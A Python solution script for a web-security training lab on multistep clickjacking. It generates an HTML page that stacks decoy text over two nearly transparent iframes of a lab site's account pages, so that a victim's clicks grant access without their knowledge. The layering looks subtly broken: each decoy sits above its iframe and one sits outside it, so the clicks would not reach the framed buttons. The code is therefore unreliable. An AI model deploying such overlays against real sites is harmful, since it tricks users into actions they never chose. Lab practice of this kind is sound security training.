"""
Lab 5: Multistep clickjacking
https://portswigger.net/web-security/clickjacking/lab-multistep
Difficulty: Practitioner

📝 The flaw: the sensitive action ("grant access" to a live chat) needs TWO
separate confirmation clicks on two different pages. Single-iframe overlay
isn't enough — stack two decoys at two different coordinates (matching where
each confirmation button lands on its respective step) so one visit walks
the victim through both clicks without any visible change on our page.
"""

from utils import get_session, log, note, check_framing_defenses

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STEP1_PAGE = f"{TARGET}/my-account"          # e.g. "Grant access" button
STEP2_PAGE = f"{TARGET}/confirm-access"      # e.g. the follow-up "Confirm" button


def build_multistep_poc():
    note("Two divs at two offsets, each over a DIFFERENT iframe — timed so the")
    note("victim's natural double-click/second click lands on the confirm step.")
    return f"""<style>
  iframe {{
    position: absolute;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
  }}
  #frame1 {{ top: 0; left: 0; z-index: 2; }}
  #frame2 {{ top: 0; left: 0; z-index: 4; display: none; }}
  div {{
    position: absolute;
    z-index: 1;
  }}
  #decoy1 {{ top: 550px; left: 60px; z-index: 3; }}
  #decoy2 {{ top: 300px; left: 60px; z-index: 5; display: none; }}
</style>

<div id="decoy1">Click to continue</div>
<iframe id="frame1" src="{STEP1_PAGE}"></iframe>

<div id="decoy2">Click to confirm</div>
<iframe id="frame2" src="{STEP2_PAGE}"></iframe>

<script>
  // After the first click lands, swap to the second overlay.
  document.getElementById('decoy1').addEventListener('click', function() {{
    document.getElementById('frame1').style.display = 'none';
    document.getElementById('decoy1').style.display = 'none';
    document.getElementById('frame2').style.display = 'block';
    document.getElementById('decoy2').style.display = 'block';
  }});
</script>"""


def run():
    s = get_session()
    check_framing_defenses(s, STEP1_PAGE)
    check_framing_defenses(s, STEP2_PAGE)

    html = build_multistep_poc()

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")

    note("Pixel-align each decoy independently using 'View exploit' for its")
    note("own step — step 2's button position is almost never the same as")
    note("step 1's, even if the pages look visually similar.")


if __name__ == "__main__":
    run()
